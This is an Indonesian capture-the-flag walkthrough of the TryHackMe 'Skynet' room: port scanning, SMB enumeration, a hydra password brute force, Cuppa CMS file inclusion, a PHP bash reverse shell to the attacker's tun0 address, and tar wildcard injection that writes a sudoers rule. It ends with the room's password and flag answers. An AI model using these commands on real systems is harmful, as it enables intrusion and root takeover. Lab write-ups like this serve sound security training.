# CTF Skynet
- TryHackMe Room: https://tryhackme.com/room/skynet
- IP Machine: 10.10.66.97

## Nmap Report
- Lakukan port scanning dengan tool `nmap`
```sh
nmap -sV -A <IP Machine>
```
- Berikut adalah hasil dari port scanning
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.66.97
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-06 21:53 EDT
Nmap scan report for 10.10.66.97
Host is up (0.23s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING UIDL SASL AUTH-RESP-CODE CAPA RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: listed capabilities have post-login more Pre-login LOGINDISABLEDA0001 SASL-IR OK LOGIN-REFERRALS IDLE ID ENABLE IMAP4rev1 LITERAL+
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-09-07T02:03:36
|_  start_date: N/A
|_clock-skew: mean: 1h40m02s, deviation: 2h53m12s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-09-06T21:03:36-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 627.49 seconds
```

## Enumerasi SMB
- Karena server menggunakan layanan SMB Server, jadi kita bisa melihat file yang di share didalamnya. Sekarang kita melihat list share yang terdapat di SMB Server. Disini ditemukan user **anonymous** dan **milesdyson** pada SMB Server 
```sh
smbclient -L <IP Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%201.JPG)

- Masuk ke dalam share **anonymous** lalu tekan enter jika dimintai password. Jika sudah terhubung, ketik `ls` untuk melihat list file dan directory
```sh
smbclient //<IP Machine>/anonymous
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%202.JPG)

- Disana terdapat file `attention.txt`, sekarang kita unduh file tersebut ke local
```sh
get attention.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%203.JPG)

- Navigasi ke folder `logs`, disana terdapat 3 buah file log. Download semua file dengan perintah `mget *` dan ketik **y** untuk setiap konfirmasi. Selanjutnya keluar dari SMB Client dengan perintah `quit`
```sh
cd logs
mget *
quit
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%204.JPG)

- Berikut ini adalah isi file **attention.txt**. Difile ini ditemukan nama user `milesdyson`
```sh
cat attention.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%205.JPG)

- Setelah dibuka, file **log1.txt** ternyata berisi wordlists yang digunakan untuk melakukan brute force
```sh
cat log1.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%206.JPG)

## Gobuster Report
- Lakukan pencarian halaman web tersembunyi dengan tool `gobuster`
```sh
gobuster dir -u http://<IP Machine> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%207.JPG)

- Ditemukan halaman **/squirrelmail** dari report gobuster. Buka halaman `http://<IP_Machine>/squirrelmail` di browser, maka langsung diarahkan ke halaman login squirrelmail

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%208.JPG)

## Exploit
- Karena sebelumnya kita menemukan file wordlist **log1.txt** maka kemungkinan kita bisa melakukan bruteforce untuk menemukan password dari user `milesdyson` untuk login ke squirrelmail 
- Lakukan Inspek Element lalu pindah tab **Network** dan lakukan percobaan login. Percobaan ini dilakukan untuk menemukan path login dan respon jika login gagal yang akan digunakan untuk melakukan bruteforce

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%209.JPG)

- Brute force akun user **milesdyson** dengan tool hydra dengan perintah sebagai berikut
```sh
hydra -l milesdyson -P log1.txt <IP Machine> http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2010.JPG)

- Password berhasil ditemukan, sekarang gunakan username dan password tersebut untuk login ke squirrelmail

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2011.JPG)

- Buka email yang memiliki Subject **Samba Password reset**. Di email ini ditemukan password untuk mengakses share SMB user `milesdyson`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2012.JPG)

- Akses share SMB user `milesdyson` lalu masukkan password yang sudah ditemukan diatas
```sh
smbclient -U milesdyson \\\\IP_Machine\\milesdyson
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2013.JPG)

- Di dalamnya terdapat folder **notes** lalu di dalam folder **notes** terdapat file **important.txt**. Download file tersebut ke local 
```sh
cd notes
get important.txt
quit
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2014.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2015.JPG)

- Berikut ini adalah isi file **important.txt**, di dalam isi file tersebut terdapat informasi path halaman **/45kra24zxs28v3yd** yang dibuat dengan CMS
```sh
cat important.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2016.JPG)

- Buka halaman **/45kra24zxs28v3yd** di browser dengan URL `http://<IP_Machine>/45kra24zxs28v3yd`. Di halaman ini kita tidak menemukan halaman yang dibuat dengan CMS sehingga kita perlu menemukan halaman tersembunyi dengan path ini

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2017.JPG)

- Gunakan tool `gobuster` untuk menemukan halaman web tersembunyi
```sh
gobuster dir -u http://<IP_Machine>/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2018.JPG)

- Ditemukan halaman **/administrator** dari report gobuster. Buka halaman `http://<IP_Machine>/45kra24zxs28v3yd/administrator` di browser, maka tampil halaman login **Cuppa CMS**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2019.JPG)

- Kita tidak bisa menggunakan default login dan password yang sudah ditemukan sebelumnya, sehingga kita perlu mencari informasi cara mengeksploitasi celah keamanan Cuppa CMS dengan tool `searchsploit`
```sh
searchsploit cuppa
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2020.JPG)

- Dari informasi diatas, diketahui bahwa celah keamanan Cuppa CMS adalah local/remote file inclusion. Informasi mengenai celah keamanan tersebut sudah tersimpan di dalam sebuah file di kali linux. Sekarang kita buka isi file tersebut
```sh
cat /usr/share/exploitdb/exploits/php/webapps/25971.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2021.JPG)

- Sekarang kita coba buka file **/etc/passwd** yang terdapat diserver dengan memanfaatkan celah keamanan local file inclusion yang terdapat di cuppa CMS dengan URL `http://<IP_Machine>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2022.JPG)

- Uji coba celah keamanan local file inclusion berhasil dilakukan. Sekarang kita coba jalankan script reverse shell dengan memanfaatkan celah keamanan remote file inclusion di cuppa CMS 
- Buat sebuah reverse shell PHP dengan kode sebagai berikut dan simpan dengan nama **php-shell.php**
```sh
<?php
	exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP tun0>/<port> 0>&1'");
?>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2023.JPG)

- Serve file **php-shell.php** dengan python
```sh
python3 -m http.server 80
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2024.JPG)

- Buat sebuah listener netcat di terminal baru
```sh
nc -lnvp <port>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2025.JPG)

- Jalankan file **php-shell.php** ke server lewat browser dengan url sebagai berikut
```sh
http://<IP_Machine>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<IP_tun0>/php-shell.php
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2026.JPG)

- Netcat berhasil terkoneksi dan masuk sebagai user **www-data**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2027.JPG)

- Pindah ke directory **/home** disana terdapat directory **milesdyson**, didalam directory **milesdyson** terdapat file **user.txt** sebagai user flag
```sh
cd /home/milesdyson
cat user.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2028.JPG)

### Privilege Escalation
- Ubah shell menjadi interactive terminal dengan python
```sh
python -c 'import pty;pty.spawn("/bin/bash")'
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2029.JPG)

- Lihat file crontab untuk melihat daftar program yang terjadwal. Disana terdapat file **backup.sh** yang berjalan setiap 1 menit
```sh
cat /etc/crontab
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2030.JPG)

- Isi file **backup.sh** adalah sebagai berikut
```sh
cd /home/milesdyson/backups
cat backup.sh
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2031.JPG)

- Skrip diatas isinya adalah memindahkan posisi directory ke **/var/www/html** kemudian menggunakan tool tar untuk mengkompresi semua file menjadi file **backup.tgz** lalu disimpan directory **/home/milesdyson/backups**
- Kita memanfaatkan script di https://gtfobins.github.io/gtfobins/tar/ untuk melakukan privilege escalation lewat tool tar
- Jalankan satu per satu perintah dibawah ini
```sh
cd /var/www/html
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
touch "/var/www/html/--checkpoint=1"
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2032.JPG)

- Tunggu setidaknya 1 menit lalu masuk ke user root
```sh
sudo su
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2033.JPG)

- Buka root flag yang berada di di direktori **/root**
```sh
cat /root/root.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Skynet/assets/sk%2034.JPG)

- **Pertanyaan:** What is Miles password for his emails?
```sh
cyborg007haloterminator
```

- **Pertanyaan:** What is the hidden directory?
```sh
/45kra24zxs28v3yd
```

- **Pertanyaan:** What is the vulnerability called when you can include a remote file for malicious purposes?
```sh
remote file inclusion
```

- **Pertanyaan:** What is the user flag?
```sh
7ce5c2109a40f958099283600a9ae807
```

- **Pertanyaan:** What is the root flag?
```sh
3f0372db24753accc7179a282cd6a949
```